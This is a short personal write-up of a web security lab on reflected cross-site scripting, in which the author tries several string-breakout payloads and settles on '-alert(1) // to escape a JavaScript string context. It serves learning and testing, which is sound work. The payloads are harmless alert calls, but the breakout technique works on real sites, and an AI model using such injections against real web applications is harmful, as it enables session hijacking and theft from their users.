# Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

**End Goal:** Perform a cross-site scripting attack that breaks out of the JavaScript string and calls the ```alert``` function.

**Analysis**

<script>
var searchTerms = 'javascript:alert(1)';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
<img src="/resources/images/tracker.gif?searchTerms=javascript%3Aalert(1)">

*Everything is encoded and I need to break out of the Javascript so the best way to do it is use '*

' onerror='alert(1)

*I was able to break out but the command didn't work because the event handler wasn't triggered.*

*Just noticed this is already in a script tag. Try:*

' javascript:'alert(1)

*Didn't work. This was stupid. It's a url scheme that only works inside an href. I need to directly run alert(1).*

' alert(1) //

*This solved the issue of the trailing '; but still didn't run.*

**Answer:** 

*I need to eliminate the space between '' and alert(1) so that there is no syntax error.*

'-alert(1) //


